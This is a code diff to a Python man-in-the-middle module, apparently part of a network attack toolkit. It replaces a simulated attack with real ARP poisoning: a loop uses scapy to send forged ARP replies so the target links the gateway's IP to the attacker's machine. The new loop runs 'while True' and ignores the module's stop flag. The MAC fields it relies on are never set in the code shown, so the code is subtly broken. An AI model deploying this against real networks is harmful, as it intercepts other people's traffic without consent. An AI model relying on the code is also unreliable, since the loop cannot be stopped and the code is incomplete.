@@ -4,9 +4,11 @@ Provides methods to ARP poison devices
 """
 
 from Network_Modules import network_adapter as iface
+from Network_Modules import net_tools as network
 from base_module import BaseModule
 from message_broker import Message
-import time
+from scapy.layers.inet import Ether
+import scapy.all as scapy
 import threading
 
 class MitmModule(BaseModule):
@@ -16,10 +18,13 @@ class MitmModule(BaseModule):
         # Module state
         self.is_poisoning = False
         self.target_ip = None
+        self.target_mac = None
+        self.target_mac_list = None
         self.target_ip_list = None
         self.gateway_ip = None
-        self.packets_captured = 0
-        
+        self.gateway_mac = None
+        self.self_mac = None
+
         # Register command handlers
         self.register_handler("poison_all", self.handle_poison_all)
         self.register_handler("poison_selected", self.handle_poison_selected)
@@ -36,6 +41,10 @@ class MitmModule(BaseModule):
         # Ensure adapter is in managed mode
         if iface.ADAPTER_STATUS == "monitor":
             iface.set_adapter_status("managed")
+
+        # Set gateway info
+        self.gateway_ip = network.get_router_ip(iface.ADAPTER_NAME)
+        self.gateway_mac = network.get_router_mac(iface.ADAPTER_NAME)
     
     def on_stop(self):
         """Cleanup module"""
@@ -64,8 +73,7 @@ class MitmModule(BaseModule):
         
         # Start poisoning
         self.is_poisoning = True
-        self.packets_captured = 0
-        
+
         poison_thread = threading.Thread(target=self._poison_worker, daemon=True)
         poison_thread.start()
         
@@ -142,24 +150,12 @@ class MitmModule(BaseModule):
             self.send_event("attack_status", {
                 "status": "poisoning",
                 "target": self.target_ip,
-                "gateway": self.gateway_ip
             })
             
             # TODO: Implement actual ARP poisoning
-            # For now, simulate the attack
-            while self.is_poisoning:
-                time.sleep(1)
-                self.packets_captured += 50
-                
-                # Send periodic updates
-                self.send_event("attack_progress", {
-                    "packets_captured": self.packets_captured,
-                    "elapsed_time": int(time.time())  # Replace with actual elapsed time
-                })
-            
-            self.send_event("attack_stopped", {
-                "total_packets": self.packets_captured
-            })
+            while True:
+                arp_response = scapy.ARP(op=2, pdst=self.target_ip, hwdst=self.target_mac, psrc=self.gateway_ip, hwsrc=self.self_mac)
+                scapy.send(arp_response, verbose=False)
             
         except Exception as e:
             self.send_event("attack_error", {"error": str(e)})
